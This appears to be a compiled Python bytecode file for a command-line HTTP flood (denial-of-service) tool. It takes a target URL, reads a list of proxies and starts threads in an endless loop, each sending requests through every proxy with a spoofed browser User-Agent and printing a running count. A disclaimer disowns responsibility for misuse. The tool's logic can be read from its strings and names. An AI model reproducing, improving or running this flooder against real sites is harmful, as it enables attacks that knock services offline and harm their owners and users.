a
    �u�`�  �                   @   s�   d dl Z d dlZd dlZd dlZd dlZd dlmZ e�� Zej	ddddd� e�
� \ZZejZedu r�ed� ed	� ed
� ed� ed�Zn edd�Ze�� Zd add� Zzejed���  W q�   ed� ed � Y q�0 q�dS )�    N)�Forez-uz--urlzEnter Website url�url)�help�destzCoded by: Anikin Luke Abalesz%github: https://github.com/abaleslukez>Note: i am no longer responsible for any misuse of this tool!.z\
Tip: before executing this code you can also use -u flag
eg.[python3 reqflood.py -u <url>]
zEnter url: zhttp_proxies.txt�rc                  C   s�   z�ddi} t D ]�}dt|� dt|� d�}tjt|| d�}td7 attj� dtj	� t� tj� dtj	� d	tj� t� d
tj
� |j� tj� d�� qW n   Y n0 d S )Nz
User-AgentzrMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36zhttp:)ZhttpZhttps)ZproxiesZheaders�   �[z] zrequest/s sent to: z [�])�proxieslist�str�requests�getr   �count�printr   ZGREENZCYANZMAGENTAZstatus_code)�header�xZproxiezr   � r   �ddos.py�flood   s    Pr   )�targetz

exiting..)r   Z	threading�os�readlineZoptparseZcoloramar   ZOptionParser�readZ
add_option�
parse_args�value�keyr   r   �input�open�proxy�	readlinesr
   r   r   ZThread�start�exitr   r   r   r   �<module>   s(   (

